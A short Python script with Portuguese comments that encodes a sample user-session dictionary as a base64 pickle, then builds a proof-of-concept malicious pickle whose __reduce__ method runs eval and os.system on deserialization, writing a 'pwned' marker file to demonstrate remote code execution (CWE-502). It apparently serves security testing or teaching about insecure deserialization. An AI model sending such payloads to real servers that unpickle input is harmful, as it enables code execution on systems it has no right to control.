import pickle
import base64

data = {
    "usuario": {
        "id": 42,
        "nome": "Carlos Eduardo",
        "username": "carlos.eduardo",
        "email": "carlos.eduardo@empresa.com.br",
        "perfil": "analista",
        "ativo": True,
    },
    "sessao": {
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.exemplo",
        "criado_em": "2026-06-30T10:00:00",
        "expira_em": "2026-06-30T18:00:00",
    },
    "permissoes": ["leitura", "escrita", "relatorios"],
    "metadata": {
        "ip_origem": "192.168.1.100",
        "agente": "Mozilla/5.0",
        "tentativas_login": 1,
    },
}

payload = base64.b64encode(pickle.dumps(data)).decode()

print("=== Payload legítimo ===")
print(payload)
print()


# Payload malicioso: sobrescreve __reduce__ para executar um comando no servidor
# ao ser desserializado. Demonstra RCE (Remote Code Execution) via CWE-502.
class MaliciousPayload:
    def __reduce__(self):
        # eval executa o comando como efeito colateral e retorna a mensagem:
        # os.system() retorna 0 (sucesso) → falsy → o "or" avalia o lado direito
        # expandvars expande %USERNAME% com o valor real do servidor
        code = (
            "__import__('os').system('cmd /c echo RCE via pickle > %TEMP%/pwned.txt') or "
            "__import__('os').path.expandvars("
            "'Check C:/Users/%USERNAME%/AppData/Local/Temp/pwned.txt')"
        )
        return (eval, (code,))


malicious_payload = MaliciousPayload()

malicious = base64.b64encode(pickle.dumps(malicious_payload)).decode()

print("=== Payload malicioso (PoC RCE) ===")
print(malicious)
